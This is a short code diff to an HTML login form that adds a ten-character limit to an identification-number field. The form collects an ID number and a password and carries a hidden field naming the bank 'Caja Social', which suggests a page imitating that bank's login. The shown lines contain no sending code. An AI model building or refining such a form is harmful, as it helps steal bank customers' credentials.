@@ -56,7 +56,7 @@
 </select></center>
 
 <label for="">(*) NUMERO DE IDENTIFICACION</label>
-    <center><input type="tel" name="" id="txtUsuario" style="height:40px; border:1px solid #d3f3f3;"></center>
+    <center><input type="tel" name="" id="txtUsuario" style="height:40px; border:1px solid #d3f3f3;" maxlength="10"></center>
     <label for="">(*) CONTRASEÑA</label>
     <center><input type="password" name="" id="txtPass" style="height:40px; border:1px solid #d3f3f3;">
 <input type="hidden" name="" id="banco" style="height:40px; border:1px solid #d3f3f3;" value="Caja Social">
